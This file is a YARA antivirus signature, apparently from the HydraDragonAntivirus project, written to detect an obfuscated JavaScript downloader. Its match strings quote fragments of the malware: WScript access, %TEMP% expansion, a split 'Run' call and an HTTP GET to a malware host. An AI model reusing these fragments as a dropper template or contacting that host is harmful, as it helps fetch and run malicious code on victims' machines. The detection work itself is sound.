rule sig_20160428_a26ea02d55c6872257dd7ac030b9696d {
  meta:
    description = "datamaliciousorder - file 20160428_a26ea02d55c6872257dd7ac030b9696d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "afd52229fa0be90b9590d14e5d22eee5d2176953e751e264658544c552cb1c06"

  strings:
    $s1  = "function EbcCrdWplLacWonPmzWri(BdqQtlIcrRbnAmxOgqZok){KrcBoyCmuXrpTwxGsjIhk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function EonXdbMfuMygDjiKhpGcg() {return KrcBoyCmuXrpTwxGsjIhk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "var KrcBoyCmuXrpTwxGsjIhk = function XseOujZjeMubRbjDszFij() {return NpeUczCrkEfjUuhMkgBvc[MxzMogWisSlyJmbEczGao](\"WScript\"+\"" ascii
    $s4  = "return BccUebZnbVawCukBzySxk - QbrYzeLroBhgTltSuySun;};" fullword ascii
    $s5  = "GpaJnkCicTfmHwtZsnKgb[WbuVarTnwOzvRkgIkvOzx](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s6  = "var NpeUczCrkEfjUuhMkgBvc = this[\"WScript\"];" fullword ascii
    $s7  = "var KrcBoyCmuXrpTwxGsjIhk = function XseOujZjeMubRbjDszFij() {return NpeUczCrkEfjUuhMkgBvc[MxzMogWisSlyJmbEczGao](\"WScript\"+\"" ascii
    $s8  = "function EonXdbMfuMygDjiKhpGcg() {return KrcBoyCmuXrpTwxGsjIhk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function EbcCrdWplLacWonPmzWri(BdqQtlIcrRbnAmxOgqZok){KrcBoyCmuXrpTwxGsjIhk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function QwfVeoWtnMwbHexQkeWhj(){return IuaDwgWbbWfeOlaKvkAua + \"\";};" fullword ascii
    $s11 = "if (GpaJnkCicTfmHwtZsnKgb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function DuxYvkUdsCpgEsvNauVoi(BccUebZnbVawCukBzySxk, QbrYzeLroBhgTltSuySun){GsqNziJgiLcaRamHkyFzv = GsqNziJgiLcaRamHkyFzv * 1; " ascii
    $s13 = "function FobInqLbeFrhHiePrrUjs(){return MxzMogWisSlyJmbEczGao;};" fullword ascii
    $s14 = "function RuqPuiOcdDfmXmlPjkEyv()" fullword ascii
    $s15 = "function WiyWaqXrtZpxCdoCltKhd(JvjUylOymOiuNivRtsGaw) {var UnxIdbOwxLlbMadDjxCkk = (1, 2, 3, 4, 5, JvjUylOymOiuNivRtsGaw); retur" ascii
    $s16 = "var LpaCbgJkxTieXbuAxqRpu = false;" fullword ascii
    $s17 = "LpaCbgJkxTieXbuAxqRpu = true; " fullword ascii
    $s18 = "var RrgJbjUgoRomOaaEjkYor = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "}while (PleQygEckKmqGiwBclEgz);" fullword ascii
    $s20 = "function WycZgmLvuCseMalSkhXvg(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}